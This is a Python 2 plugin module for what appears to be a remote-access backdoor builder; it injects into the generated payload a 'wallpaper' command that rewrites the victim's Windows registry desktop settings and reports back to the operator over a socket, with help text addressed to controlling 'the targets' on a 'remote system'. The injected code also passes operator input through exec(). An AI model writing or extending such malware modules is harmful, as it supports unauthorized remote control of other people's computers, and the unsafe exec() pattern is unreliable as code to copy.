import library.modules.config as config

config.main()


def main(option):
    if option == 'generate':
        config.import_statements.append('from win32api import RegOpenKeyEx, RegSetValueEx')
        config.import_statements.append('from win32con import HKEY_CURRENT_USER, KEY_SET_VALUE, REG_SZ, SPI_SETDESKWALLPAPER')
        config.import_statements.append('from win32gui import SystemParametersInfo')
        config.functions.append('''
def wallpaper(data):
    path = data.split(' ',1)[1]
    exec("path = r'" + path + "'")
    key = RegOpenKeyEx(HKEY_CURRENT_USER,"Control Panel\\Desktop",0,KEY_SET_VALUE)
    RegSetValueEx(key, "WallpaperStyle", 0, REG_SZ, "0")
    RegSetValueEx(key, "CenterWallpaper", 0, REG_SZ, "0")
    SystemParametersInfo(SPI_SETDESKWALLPAPER, path, 1+2)
    s.sendall('[+]Set wallpaper to : ' + path)
''')
        config.logics.append('''
            elif command == "wallpaper":
                wallpaper(data)''')
        config.help_menu[
            'wallpaper <Remote path of picture>'] = 'Set the targets wallpaper to a specified image file on the remote system'
    elif option == 'info':
        print '\nName             : Wallpaper Changer' \
              '\nOS               : Windows' \
              '\nRequired Modules : win32api (External), win32con (External), win32gui (External)' \
              '\nCommands         : wallpaper <Remote path of picture>' \
              '\nDescription      : Set the targets wallpaper to a specified image file on the remote system\n'
